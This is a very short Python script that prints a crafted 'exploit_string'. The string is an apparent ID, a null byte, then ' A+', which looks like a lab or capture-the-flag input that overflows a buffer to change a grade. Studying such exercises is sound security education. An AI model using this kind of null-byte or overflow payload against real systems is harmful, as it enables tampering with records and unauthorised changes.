import sys

exploit_string = b'u1370587\x00 A+'

sys.stdout.buffer.write(exploit_string)
